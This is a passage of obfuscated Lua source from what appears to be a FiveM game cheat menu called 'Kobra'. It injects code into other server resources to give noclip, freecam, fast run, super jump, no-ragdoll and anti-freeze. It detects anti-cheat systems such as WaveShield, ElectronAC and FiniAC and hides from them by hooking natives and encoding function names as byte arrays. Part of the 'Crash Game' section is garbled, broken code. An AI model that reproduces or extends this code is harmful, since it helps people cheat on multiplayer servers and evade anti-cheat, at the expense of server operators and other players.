                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.KobraNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.KobraNoclipEnabled = true
                                    _G.KobraNoclipSpeed = ]]   .. v342   .. [[
                                end
                            ]] );elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(902 -(813 + 86) ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v342   .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.KobraNoclipSpeed or ]]   .. v342   .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.KobraNoclipSpeed = ]]   .. v342   .. [[
                                            end
                                        ]] );else MachoInjectResource2(3 + 0 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipSpeed = ]]   .. v342   .. [[
                                            if not _G.KobraNoclipThreadRunning then
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.KobraNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.KobraNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.KobraNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.KobraNoclipEnabled = true
                                                _G.KobraNoclipSpeed = ]]   .. v342   .. [[
                                            end
                                        ]] );end break;end end elseif (GetResourceState("WaveShield")=="started") then MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                    _G.KobraNoclipEnabled = false
                                    _G.KobraNoclipThreadRunning = false
                                ]]);elseif ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started")) then MachoInjectResource2(4 -1 ,((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.KobraNoclipEnabled = false
                                            _G.KobraNoclipThreadRunning = false
                                        ]]);end end},{type="slider-checkbox",label="Freecam",scrollType="onScroll",checked=false,value=0.25 + 0 ,step=0.25 -0 ,min=0.25,max=1091 -(860 + 226) ,onSelect=function(v344,v345) v269:ToggleFreecam(v345,v344);end},{type="checkbox",label="Fast Run",checked=false,onSelect=function(v346) if v346 then local v589=303 -(121 + 182) ;while true do if (v589==(0 + 0)) then v12:Notify("success","Kobra","Fast Run On",4240 -(988 + 252) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]]);else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]);end break;end end else local v590=0 + 0 ;while true do if (v590==(0 + 0)) then v12:Notify("error","Kobra","Fast Run Off",4970 -(49 + 1921) );if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]]);else MachoInjectResourceRaw("any",[[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]]);end break;end end end end},{type="checkbox",label="Super Jump",checked=false,onSelect=function(v347) local v348=GetResourceState("WaveShield")=="started" ;local function v349(v533) local v534="";for v591=1, #v533 do v534=v534   .. string.char(v533[v591]) ;end return v534;end local function v350(v535) return _G[v349(v535)];end local function v351() if  not _G.superJumpEnabled then local v716=0;while true do if (v716==(52 -(51 + 1))) then _G.superJumpEnabled=true;v350({67,243 -129 ,29 + 72 ,270 -173 ,116,43 + 58 ,84,43 + 61 ,114,101,81 + 16 ,68 + 32 })(function() while _G.superJumpEnabled do v350({8 + 75 ,87 + 14 ,116,48 + 35 ,281 -(149 + 15) ,229 -(39 + 78) ,101,114,206 -132 ,71 + 46 ,109,112,160 -76 ,365 -261 ,3 + 102 ,107 + 8 ,70,352 -238 ,29 + 68 ,58 + 51 ,68 + 33 })(v350({80,281 -173 ,1535 -(1059 + 379) ,63 + 58 ,493 -(145 + 247) ,114,34 + 39 ,296 -196 })());Wait(0 + 0 );end end);break;end end end end local function v352() local v536=0 + 0 ;while true do if (v536==0) then _G.superJumpEnabled=false;v350({83,101,116,263 -180 ,117,49 + 63 ,101,429 -315 ,74,117,109,58 + 54 ,84,898 -(413 + 381) ,105,115,70,2084 -(582 + 1388) ,70 + 27 ,109,298 -197 })(v350({80,728 -(47 + 573) ,97,121,428 -327 ,1778 -(1269 + 395) ,73,592 -(76 + 416) })(),444 -(319 + 124) );break;end end end if v347 then if v348 then v351();else MachoInjectResourceRaw("any",[[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]]);end elseif v348 then print("off");v352();else MachoInjectResourceRaw("any",[[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]]);end end}}},{label="Miscellaneous",tabs={{icon="",type="button",label="Crash Game",desc="Crashes your game",onSelect=function() MachoInjectResourceRaw("any",[[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]]);end},{icon="",type="button",label="Clear Screen Effects",desc="Removes all screen effects",onSelect=function() print("Revive");end},{icon="",type="button",label="Suicide",desc="This will kill you.",onSelect=function() local function v353() local v537=SetEntityHealth;v537(PlayerPedId(),458 -(337 + 121) );end v353();end},{icon="",type="button",label="Force Ragdoll",desc="This will ragdoll.",onSelect=function() MachoInjectResourceRaw("any",[[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]]);end},{icon="",type="button",label="Remove Crutch",desc="Remove Crutch is the server is using the correct resource",onSelect=function() MachoResourceStop("wasabi_crutch");end},{icon="",type="scrollable",value=1912 -(1261 + 650) ,values={"Primary","Secondary"},label="Clear Tasks",desc="Clears the character's tasks",onSelect=function(v354) if (v354=="Primary") then ClearPedTasksImmediately(PlayerPedId());elseif (v354=="Secondary") then ClearPedSecondaryTask(PlayerPedId());end end},{type="divider",label="Toggles"},{type="checkbox",label="No Ragdoll",checked=false,desc="This will prevent you from being ragdolled from admins or cheaters.",onSelect=function(v355) local v356=144 -(102 + 42) ;local v357;local v358;while true do if (v356==1) then if v355 then if v357 then v12:Notify("success","Kobra","No Ragdoll Enabled",4844 -(1524 + 320) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]]);else v48(v358,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Enabled (Fallback)",4270 -(1049 + 221) );end elseif v357 then v12:Notify("success","Kobra","No Ragdoll Disabled",3156 -(18 + 138) );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            noRagdollEnabled = false
                                        ]]);else local v926=0 -0 ;while true do if (v926==(1102 -(67 + 1035))) then v48(v358,[[
                                            noRagdollEnabled = false
                                        ]]);v12:Notify("success","Kobra","No Ragdoll Disabled (Fallback)",3000);break;end end end break;end if (v356==(348 -(136 + 212))) then v357=GetResourceState("WaveShield")=="started" ;v358=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;v356=4 -3 ;end end end},{type="checkbox",label="Anti-Freeze",checked=false,desc="This will prevent you from being frozen.",onSelect=function(v359) local v360=GetResourceState("WaveShield")=="started" ;local v361=((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ;if v359 then if v360 then v12:Notify("success","Kobra","Anti-Freeze Enabled",2766 + 234 );v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]]);else local v773=1604 -(240 + 1364) ;while true do if (v773==(1082 -(1050 + 32))) then v48(v361,[[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]]);v12:Notify("success","Kobra","Anti-Freeze Enabled (Fallback)",3000);break;end end end elseif v360 then local v774=0 -0 ;while true do if ((0 + 0)==v774) then v12:Notify("error","Kobra","Anti-Freeze Disabled",3000);v48(((GetResourceState("lb-phone")=="started") and "lb-phone") or "WaveShield" ,[[
                                            antiFreezeEnabled = false
                                        ]]);break;end end else local v775=1055 -(331 + 724) ;while true do if (v775==0) then v48(v361,[[
                                            antiFreezeEnabled = false
                                        ]]);v12:Notify("error","Kobra","Anti-Freeze Disabled (Fallback)",243 + 2757 );break;end end end end},{type="checkbox",label="Force Third Person",checked=false,desc="This will force third person.",onSelect=function(v362) if v362 then v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
